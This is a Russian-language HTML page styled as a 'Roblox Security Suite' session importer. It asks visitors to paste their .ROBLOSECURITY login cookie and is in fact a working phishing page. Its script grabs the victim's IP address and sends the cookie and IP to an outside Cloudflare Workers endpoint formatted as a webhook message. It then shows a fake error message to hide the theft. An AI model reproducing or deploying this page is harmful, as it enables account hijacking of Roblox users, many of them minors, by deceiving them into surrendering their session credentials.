
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>✦ ROBLOX Security Suite ✦</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-dark: #0b0b14;
            --bg-card: rgba(15, 15, 25, 0.65);
            --border-glow: rgba(138, 92, 246, 0.6);
            --text-main: #f0e6ff;
            --text-dim: #c084fc;
            --accent: #a855f7;
            --accent-hover: #c084fc;
            --shadow: 0 0 20px rgba(168, 85, 247, 0.3);
            --cookie-bg: #0a0a12;
        }

        body.light {
            --bg-dark: #eef2ff;
            --bg-card: rgba(255, 255, 255, 0.75);
            --border-glow: rgba(100, 120, 200, 0.6);
            --text-main: #1a1a2e;
            --text-dim: #4a4a8a;
            --accent: #5a7dae;
            --accent-hover: #8aadcc;
            --shadow: 0 0 20px rgba(90, 125, 174, 0.3);
            --cookie-bg: #ffffff;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0b0b14 0%, #141028 50%, #1a0f2e 100%);
            background-attachment: fixed;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            transition: background 0.3s ease;
        }

        body.light {
            background: linear-gradient(135deg, #eef2ff 0%, #e0e7f5 100%);
        }

        /* Звёздный фон */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            opacity: 0;
            animation: twinkle 3s infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.2; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.2); }
        }

        /* Летающие печеньки */
        .floating-cookie {
            position: fixed;
            pointer-events: none;
            font-size: 28px;
            z-index: 0;
            opacity: 0.4;
            animation: floatAnim linear infinite;
            filter: drop-shadow(0 0 5px var(--accent));
        }
        @keyframes floatAnim {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            20% { opacity: 0.6; }
            80% { opacity: 0.6; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        /* Карточка */
        .glass-card {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 40px 36px;
            max-width: 520px;
            width: 100%;
            border: 1px solid var(--border-glow);
            box-shadow: var(--shadow);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            z-index: 10;
            position: relative;
        }
        .glass-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 30px var(--accent);
        }

        /* Лого */
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            font-size: 42px;
            font-weight: 800;
            background: linear-gradient(135deg, #f0e6ff, var(--accent), #c084fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
        }
        .logo p {
            color: var(--text-dim);
            font-size: 10px;
            letter-spacing: 4px;
            margin-top: 8px;
            text-transform: uppercase;
        }

        /* Инпуты */
        .label {
            color: var(--text-dim);
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .cookie-input {
            width: 100%;
            background: var(--cookie-bg);
            border: 1px solid var(--border-glow);
            border-radius: 28px;
            padding: 18px 20px;
            color: var(--text-main);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            resize: vertical;
            transition: 0.2s;
        }
        .cookie-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 12px var(--accent);
        }

        /* Статус */
        .status {
            font-size: 13px;
            margin: 15px 0 24px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-dim);
            background: rgba(0,0,0,0.1);
            padding: 8px 16px;
            border-radius: 40px;
            backdrop-filter: blur(4px);
        }

        /* Кнопка */
        .btn {
            width: 100%;
            background: linear-gradient(135deg, #7c3aed, var(--accent));
            border: none;
            border-radius: 60px;
            padding: 16px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 0 8px var(--accent);
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px var(--accent);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Сообщения */
        .message-area {
            text-align: center;
            margin-top: 20px;
        }
        .error-text {
            color: #ff8a7a;
            background: rgba(255, 70, 50, 0.12);
            padding: 12px;
            border-radius: 60px;
            font-size: 13px;
            font-weight: 500;
            backdrop-filter: blur(4px);
        }

        /* Тумблер темы */
        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 100;
        }
        .theme-btn {
            background: var(--bg-card);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border-glow);
            border-radius: 60px;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-dim);
            transition: 0.2s;
        }
        .theme-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 12px var(--accent);
        }

        /* Анимация кнопки */
        @keyframes shake {
            0%,100%{transform:translateX(0)}
            25%{transform:translateX(-4px)}
            75%{transform:translateX(4px)}
        }
        .shake {
            animation: shake 0.2s ease;
        }
    </style>
</head>
<body>
<div class="theme-switch">
    <button class="theme-btn" id="themeToggleBtn">🌙 Тема</button>
</div>
<div class="stars" id="stars"></div>
<div class="glass-card">
    <div class="logo">
        <h1>✦ RBX Security ✦</h1>
        <p>SESSION IMPORTER</p>
    </div>
    <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
    <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
    <div class="status" id="status">
        <span>✨</span> Ожидание ввода...
    </div>
    <button class="btn" id="sendBtn" disabled>🔄 Заменить сессию</button>
    <div id="messageArea" class="message-area"></div>
</div>

<script>
    (function(){
        
        const PROXY_URL = "https://robl.megadoner517.workers.dev";

        // ========== ТЕМА ==========
        const themeBtn = document.getElementById('themeToggleBtn');
        function loadTheme(){
            const saved = localStorage.getItem('rbx_theme');
            if(saved === 'light'){
                document.body.classList.add('light');
                if(themeBtn) themeBtn.innerHTML = '☀️ Тема';
            } else {
                document.body.classList.remove('light');
                if(themeBtn) themeBtn.innerHTML = '🌙 Тема';
            }
        }
        function toggleTheme(){
            if(document.body.classList.contains('light')){
                document.body.classList.remove('light');
                localStorage.setItem('rbx_theme', 'dark');
                if(themeBtn) themeBtn.innerHTML = '🌙 Тема';
            } else {
                document.body.classList.add('light');
                localStorage.setItem('rbx_theme', 'light');
                if(themeBtn) themeBtn.innerHTML = '☀️ Тема';
            }
        }
        if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
        loadTheme();

        // ========== ЗВЁЗДЫ ==========
        function createStars(){
            const container = document.getElementById('stars');
            for(let i=0;i<120;i++){
                const star = document.createElement('div');
                star.classList.add('star');
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.animationDelay = Math.random() * 5 + 's';
                star.style.animationDuration = Math.random() * 3 + 2 + 's';
                container.appendChild(star);
            }
        }
        createStars();

        // ========== ПЕЧЕНЬКИ ==========
        for(let i=0;i<35;i++){
            let cookie = document.createElement('div');
            cookie.classList.add('floating-cookie');
            cookie.textContent = '🍪';
            cookie.style.left = Math.random() * 100 + '%';
            cookie.style.fontSize = (20 + Math.random() * 32) + 'px';
            cookie.style.animationDuration = (8 + Math.random() * 16) + 's';
            cookie.style.animationDelay = Math.random() * -20 + 's';
            document.body.appendChild(cookie);
        }

        // ========== ЛОГИКА ==========
        const cookieInput = document.getElementById('cookie');
        const sendBtn = document.getElementById('sendBtn');
        const statusDiv = document.getElementById('status');
        const msgArea = document.getElementById('messageArea');

        function isValidCookie(val){
            if(!val || val.trim() === '') return false;
            const t = val.trim();
            if(!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
            if(t.length < 100) return false;
            return true;
        }

        function updateUI(){
            const val = cookieInput.value;
            if(!val || val.trim() === ''){
                statusDiv.innerHTML = '<span>✨</span> Ожидание ввода...';
                statusDiv.style.color = '#a78bfa';
                sendBtn.disabled = true;
            } else if(isValidCookie(val)){
                statusDiv.innerHTML = '<span>✅</span> Кука валидна! Готов к отправке.';
                statusDiv.style.color = '#22c55e';
                sendBtn.disabled = false;
            } else {
                statusDiv.innerHTML = '<span>❌</span> Неверный формат куки. Проверьте значение.';
                statusDiv.style.color = '#ef4444';
                sendBtn.disabled = true;
            }
        }

        function showMessage(text){
            msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
            setTimeout(() => msgArea.innerHTML = '', 4000);
        }

        cookieInput.addEventListener('input', updateUI);
        cookieInput.addEventListener('paste', () => setTimeout(updateUI, 10));
        updateUI();

        sendBtn.onclick = async () => {
            const cookie = cookieInput.value.trim();
            if(!isValidCookie(cookie)) return;
            if(!PROXY_URL){
                showMessage('Ошибка инициализации. Обновите страницу.');
                return;
            }
            sendBtn.disabled = true;
            sendBtn.textContent = "⏳ Отправка...";

            let ip = 'unknown';
            try{
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e){}

            const msg = {
                content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${cookie.length} символов\n**Содержимое:**\n\`\`\`${cookie}\`\`\``
            };

            try{
                const response = await fetch(PROXY_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(msg)
                });
                if(response.ok || response.status === 500){
                    showMessage('Ошибка перенаправления! Обратитесь в поддержку.');
                } else {
                    showMessage('Ошибка отправки. Попробуйте позже.');
                }
            } catch(e){
                showMessage('Ошибка сети. Попробуйте позже.');
            }

            sendBtn.disabled = false;
            sendBtn.textContent = "🔄 Заменить сессию";
        };
    })();
</script>
</body>
</html>
